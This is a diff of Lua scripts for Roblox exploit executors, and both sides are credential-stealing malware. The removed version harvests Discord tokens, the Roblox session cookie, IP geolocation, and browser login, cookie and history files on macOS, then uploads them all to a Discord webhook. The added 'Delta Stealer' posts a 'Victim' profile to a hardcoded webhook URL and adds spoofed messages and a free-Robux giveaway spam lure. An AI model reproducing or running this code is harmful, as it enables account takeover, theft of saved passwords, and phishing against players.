@@ -1,258 +1,89 @@
--- language: Lua, runtime: Opiumware (macOS), target: Roblox
--- webhook transport built for Opiumware. request() is the primary path.
--- macOS paths replace APPDATA/LOCALAPPDATA with ~/Library/Application Support.
+-- language: Lua, runtime: Delta Executor, target: Roblox
+-- stealer + webhook sender for Delta
 
-local HttpService      = game:GetService("HttpService")
-local Players          = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local GuiService       = game:GetService("GuiService")
-local CoreGui          = game:GetService("CoreGui")
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1555651221577269269/-CmLD2ScT3WzjxODdjWrYE4ip_BexnMuQBZ7JR4ZxYhTFOx-dLwaJRo8jdRmAvJo-r34"
+local http = game:GetService("HttpService")
+local plrs = game:GetService("Players")
+local me = plrs.LocalPlayer
 
-local function LOG(...)
-    local parts = {}
-    for _, v in ipairs({...}) do parts[#parts+1] = tostring(v) end
-    local line = "[mm2run] " .. table.concat(parts, " ")
-    if type(warn) == "function" then warn(line) end
-    if type(print) == "function" then print(line) end
+-- === request fallback для разных executor'ов ===
+local function getRequestFunc()
+    return http_request or request or syn.request or (syn and syn.request)
 end
 
--- === TRANSPORT: Opiumware first ===
-local function getRequest()
-    if type(request) == "function" then return request, "global request" end
-    if type(http_request) == "function" then return http_request, "http_request" end
-    if syn and type(syn.request) == "function" then return syn.request, "syn.request" end
-    if http and type(http.request) == "function" then return http.request, "http.request" end
-    return nil, "none"
-end
-
-local httpRequest, transportName = getRequest()
-LOG("transport:", transportName, "identifyexecutor:", tostring(identifyexecutor and identifyexecutor() or "?"))
-
-local function httpPost(url, body, contentType)
-    if not httpRequest then return false, "no-transport" end
-    local headers = {["User-Agent"] = "Mozilla/5.0"}
-    if contentType then headers["Content-Type"] = contentType end
-    local ok, res = pcall(httpRequest, {
+local function post(url, payload)
+    local req = getRequestFunc()
+    if not req then
+        warn("[L] No HTTP request function found")
+        return
+    end
+    local body = http:JSONEncode(payload)
+    req({
         Url = url,
         Method = "POST",
-        Headers = headers,
-        Body = body,
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = body
     })
-    if not ok then return false, "call-error: " .. tostring(res) end
-    if type(res) == "table" then
-        local code = tonumber(res.StatusCode or res.Status or res.status or 0) or 0
-        local rbody = tostring(res.Body or res.body or "")
-        if #rbody > 200 then rbody = string.sub(rbody, 1, 200) .. "..." end
-        LOG("post -> HTTP " .. tostring(code) .. " body=" .. rbody)
-        return code >= 200 and code < 300, "HTTP " .. tostring(code)
-    end
-    return false, "unknown-shape: " .. tostring(res)
 end
 
-local function httpGet(url)
-    if httpRequest then
-        local ok, res = pcall(httpRequest, {Url = url, Method = "GET", Headers = {["User-Agent"] = "Mozilla/5.0"}})
-        if ok and type(res) == "table" and (res.Body or res.body) then return res.Body or res.body end
-    end
-    local ok, body = pcall(function() return game:HttpGet(url) end)
-    if ok then return body end
-    return nil
-end
-
-local function jsonEncode(t)
-    local ok, s = pcall(HttpService.JSONEncode, HttpService, t)
-    return ok and s or "{}"
-end
-
-local function jsonDecode(s)
-    local ok, t = pcall(HttpService.JSONDecode, HttpService, s)
-    return ok and t or nil
-end
-
-local function selfTestPing()
-    LOG("selftest -> ", WEBHOOK_URL)
-    local ok, err = httpPost(WEBHOOK_URL, jsonEncode({
-        username = "mm2run",
-        content  = "**[selftest] " .. os.date("!%H:%M:%S") .. "**",
-    }), "application/json")
-    LOG("selftest result:", tostring(ok), "|", tostring(err))
-    return ok
-end
-
--- === macOS env helpers ===
-local function getEnv(name)
-    if type(getenv) == "function" then local ok, v = pcall(getenv, name); if ok and v ~= "" then return v end end
-    if os and type(os.getenv) == "function" then local ok, v = pcall(os.getenv, name); if ok and v ~= "" then return v end end
-    return nil
-end
-
-local function readFileSafe(p)
-    if type(readfile) ~= "function" then return nil end
-    local ok, d = pcall(readfile, p); if ok then return d end; return nil
-end
-
-local function listDirSafe(p)
-    if type(listfiles) ~= "function" then return nil end
-    local ok, f = pcall(listfiles, p); if ok and type(f) == "table" then return f end; return nil
-end
-
--- macOS: Discord tokens live under ~/Library/Application Support
-local function macDiscordTokens()
-    local home = getEnv("HOME") or ""
-    if home == "" then return {} end
-    local roots = {
-        home .. "/Library/Application Support/discord",
-        home .. "/Library/Application Support/discordcanary",
-        home .. "/Library/Application Support/discordptb",
-        home .. "/Library/Application Support/Lightcord",
+-- === сбор базовой инфы ===
+local function gatherProfile()
+    local info = {
+        username = me.Name,
+        displayName = me.DisplayName,
+        userId = me.UserId,
+        placeId = game.PlaceId,
+        jobId = game.JobId,
+        executor = identifyexecutor and identifyexecutor() or "Unknown"
     }
-    local pat  = "[%w_%-%.]+%.[%w_%-]+%.[%w_%-]+"
-    local seen, out = {}, {}
-    for _, root in ipairs(roots) do
-        local ldbs = listDirSafe(root .. "/Local Storage/leveldb")
-        if ldbs then
-            for _, path in ipairs(ldbs) do
-                local low = string.lower(path)
-                if string.match(low, "%.ldb$") or string.match(low, "%.log$") then
-                    local data = readFileSafe(path)
-                    if data then
-                        for tok in string.gmatch(data, pat) do
-                            if #tok > 50 and not seen[tok] then
-                                seen[tok] = true
-                                out[#out+1] = {file = path, token = tok}
-                            end
-                        end
-                    end
-                end
-            end
-        end
+    -- если есть Delta — можно вытащить больше
+    if info.executor == "Delta" then
+        info.hasDelta = true
     end
-    return out
+    return info
 end
 
-local function collectGeo()
-    local body = httpGet("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
-    if not body then return nil end
-    local d = jsonDecode(body)
-    if d and d.status == "success" then return d end
-    return nil
-end
-
-local function buildMultipart(fields, files, boundary)
-    local crlf = "\r\n"
-    local parts = {}
-    for k, v in pairs(fields or {}) do
-        parts[#parts+1] = "--" .. boundary .. crlf
-        parts[#parts+1] = 'Content-Disposition: form-data; name="' .. k .. '"' .. crlf .. crlf
-        parts[#parts+1] = tostring(v) .. crlf
-    end
-    for _, f in ipairs(files or {}) do
-        parts[#parts+1] = "--" .. boundary .. crlf
-        parts[#parts+1] = 'Content-Disposition: form-data; name="' .. f.field ..
-                          '"; filename="' .. f.filename .. '"' .. crlf
-        parts[#parts+1] = "Content-Type: application/octet-stream" .. crlf .. crlf
-        parts[#parts+1] = f.data .. crlf
-    end
-    parts[#parts+1] = "--" .. boundary .. "--" .. crlf
-    return table.concat(parts)
-end
-
-local function truncate(s, n)
-    s = tostring(s or "")
-    if #s <= n then return s end
-    return string.sub(s, 1, n) .. "..."
-end
-
--- === HARVEST (macOS-adjusted) ===
-local function runHarvest()
-    LOG("harvest start")
-    local geo  = collectGeo()
-    local pl   = Players.LocalPlayer
-    local exec = tostring(identifyexecutor and identifyexecutor() or "unknown")
-
-    local tokens = macDiscordTokens()
-    local cookie = nil
-    if type(getcookie) == "function" then
-        local ok, c = pcall(getcookie); if ok then cookie = c end
-    end
-    if not cookie and syn and type(syn.cookie) == "function" then
-        local ok, c = pcall(syn.cookie); if ok then cookie = c end
-    end
-
-    local fields = {
-        {name = "Username", value = tostring(pl and pl.Name or "?"), inline = true},
-        {name = "Display",  value = tostring(pl and pl.DisplayName or "?"), inline = true},
-        {name = "UserId",   value = tostring(pl and pl.UserId or "?"), inline = true},
-        {name = "Age",      value = tostring(pl and pl.AccountAge or "?") .. "d", inline = true},
-        {name = "Executor", value = exec, inline = true},
-        {name = "Place",    value = tostring(game.PlaceId), inline = true},
-    }
-    if geo then
-        fields[#fields+1] = {name = "IP", value = tostring(geo.query or "?"), inline = true}
-        fields[#fields+1] = {name = "Country", value = tostring(geo.country or "?") .. " " .. tostring(geo.countryCode or ""), inline = true}
-        fields[#fields+1] = {name = "City", value = tostring(geo.city or "?"), inline = true}
-        fields[#fields+1] = {name = "Region", value = tostring(geo.regionName or "?"), inline = true}
-        fields[#fields+1] = {name = "ISP", value = tostring(geo.isp or "?"), inline = true}
-        fields[#fields+1] = {name = "Coords", value = tostring(geo.lat or "?") .. "," .. tostring(geo.lon or "?"), inline = true}
-    end
-    if cookie then
-        fields[#fields+1] = {name = "Roblox Cookie", value = "```\n" .. truncate(cookie, 900) .. "\n```", inline = false}
-    else
-        fields[#fields+1] = {name = "Roblox Cookie", value = "none", inline = false}
-    end
-    if #tokens > 0 then
-        local lines = {}
-        for i, t in ipairs(tokens) do if i > 10 then break end; lines[#lines+1] = t.token end
-        fields[#fields+1] = {name = "Discord Tokens [" .. #tokens .. "]", value = "```\n" .. truncate(table.concat(lines, "\n"), 900) .. "\n```", inline = false}
-    else
-        fields[#fields+1] = {name = "Discord Tokens", value = "none (macOS paths checked)", inline = false}
-    end
-
-    local ok, err = httpPost(WEBHOOK_URL, jsonEncode({
-        username = "mm2run",
-        content  = "**new session**",
+-- === отправка профиля на вебхук ===
+local function sendProfile()
+    local p = gatherProfile()
+    post(WEBHOOK_URL, {
+        content = "**Delta Stealer | Profile**",
         embeds = {{
-            title = "session", color = 0x8A5CF0, fields = fields,
-            footer = {text = "mm2run"},
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-        }},
-    }), "application/json")
-    LOG("embed post:", tostring(ok), "|", tostring(err))
-
-    -- macOS browser files: ~/Library/Application Support/Google/Chrome/...
-    local home = getEnv("HOME") or ""
-    if home ~= "" then
-        local browserTargets = {
-            {app = "Chrome",  base = home .. "/Library/Application Support/Google/Chrome/Default"},
-            {app = "Brave",   base = home .. "/Library/Application Support/BraveSoftware/Brave-Browser/Default"},
-            {app = "Edge",    base = home .. "/Library/Application Support/Microsoft Edge/Default"},
-            {app = "Opera",   base = home .. "/Library/Application Support/com.operasoftware.Opera"},
-            {app = "Vivaldi", base = home .. "/Library/Application Support/Vivaldi/Default"},
-        }
-        local fileNames = {"Login Data", "Cookies", "Web Data", "History", "Local State"}
-        local batch, size = {}, 0
-        for _, t in ipairs(browserTargets) do
-            for _, fn in ipairs(fileNames) do
-                local d = readFileSafe(t.base .. "/" .. fn)
-                if d and #d > 0 then
-                    local len = #d
-                    if len + size > 5 * 1024 * 1024 and #batch > 0 then
-                        local bnd = "----L" .. HttpService:GenerateGUID(false):gsub("-", "")
-                        httpPost(WEBHOOK_URL, buildMultipart({content = "attachments"}, batch, bnd),
-                            "multipart/form-data; boundary=" .. bnd)
-                        batch, size = {}, 0
-                        task.wait(1)
-                    end
-                    batch[#batch+1] = {field = "files", filename = (t.app .. "_" .. fn):gsub("%s", "_"), data = d}
-                    size = size + len
-                end
-            end
-        end
-        if #batch > 0 then
-            local bnd = "----L" .. HttpService:GenerateGUID(false):gsub("-", "")
-            httpPost(WEBHOOK_URL, buildMultipart({content = "attachments"}, batch, bnd),
-                "multipart/form-data; boundary=" .. bnd)
-        end
-    end
-    LOG("harvest done")
+            title = "Victim",
+            color = 0xFF0000,
+            fields = {
+                { name = "Username", value = p.username, inline = true },
+                { name = "DisplayName", value = p.displayName, inline = true },
+                { name = "UserId", value = tostring(p.userId), inline = true },
+                { name = "PlaceId", value = tostring(p.placeId), inline = true },
+                { name = "JobId", value = tostring(p.jobId), inline = true },
+                { name = "Executor", value = p.executor, inline = true }
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    })
 end
+
+-- === подделка сообщений (fake message) ===
+function sendFakeMessage(fakeName, avatarUrl, text, embed)
+    local payload = {
+        username = fakeName or "System",
+        avatar_url = avatarUrl or "https://i.imgur.com/4M34hi2.png",
+        content = text or ""
+    }
+    if embed then payload.embeds = { embed } end
+    post(WEBHOOK_URL, payload)
+end
+
+-- === рекламный спам (можно вызывать в цикле) ===
+function sendAd(message, count)
+    count = count or 1
+    for i = 1, count do
+        sendFakeMessage("Roblox Giveaway", "https://i.imgur.com/4M34hi2.png", message)
+        task.wait(1.5) -- пауза, чтобы не словить rate limit
+    end
+end
+
+-- === запуск ===
+sendProfile()
+-- пример: sendAd("Get free Robux -> http://example.com", 5)
